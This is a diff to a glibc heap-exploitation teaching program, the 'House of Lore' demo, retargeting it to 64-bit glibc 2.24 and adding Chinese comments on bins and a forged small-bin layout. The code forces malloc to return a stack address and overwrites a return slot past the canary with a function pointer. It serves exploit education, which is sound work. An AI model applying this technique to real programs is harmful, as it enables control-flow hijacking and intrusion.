@@ -36,10 +36,11 @@ int main(int argc, char * argv[]){
 
   fprintf(stderr, "\nWelcome to the House of Lore\n");
   fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n");
-  fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");
+  //fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n");
+  fprintf(stderr, "This is tested against Debian9 - 64bit - glibc-2.24\n\n");
 
   fprintf(stderr, "Allocating the victim chunk\n");
-  intptr_t *victim = malloc(100);
+  intptr_t *victim = malloc(200);   // <=120 的bin将放到fastbins中
   fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim);
 
   // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
@@ -63,12 +64,12 @@ int main(int argc, char * argv[]){
   
   fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with"
          "the small one during the free()\n");
-  void *p5 = malloc(1000);
+  void *p5 = malloc(1000);  // 在victim与top_chunk之间随便申请一块内存,避免free(victim)后victim与top_chunk合并
   fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5);
 
 
   fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
-  free((void*)victim);
+  free((void*)victim);  // victim被放到unsorted中了
 
   fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n");
   fprintf(stderr, "victim->fwd: %p\n", (void *)victim[0]);
@@ -77,7 +78,7 @@ int main(int argc, char * argv[]){
   fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
   fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);
 
-  void *p2 = malloc(1200);
+  void *p2 = malloc(1200);  // victim被放到smallbins中了
   fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2);
 
   fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
@@ -92,20 +93,36 @@ int main(int argc, char * argv[]){
 
   //------------------------------------
 
+/*
+伪造好的内存布局
+smallbins
+ |  ^
+ V  |
+victim
+ |  ^
+ V  |
+stack_buffer_1
+ |  ^
+ V  |
+stack_buffer_2
+*/
+
   fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
   fprintf(stderr, "This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n");
 
-  void *p3 = malloc(100);
+  void *p3 = malloc(200);
+  fprintf(stderr, "p3在victim相同位置上%p\n", p3);
 
 
   fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
-  char *p4 = malloc(100);
-  fprintf(stderr, "p4 = malloc(100)\n");
+  char *p4 = malloc(200);
+  fprintf(stderr, "p4 = malloc(200)\n");
 
   fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
          stack_buffer_2[2]);
 
-  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
+  fprintf(stderr, "\n&stack_buffer_1[2]=%p\n", &stack_buffer_1[2]);
+  fprintf(stderr, "\np4 is %p and should be on the stack and equal &stack_buffer_1[2].\n", p4); // this chunk will be allocated on stack
   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
   memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
 }
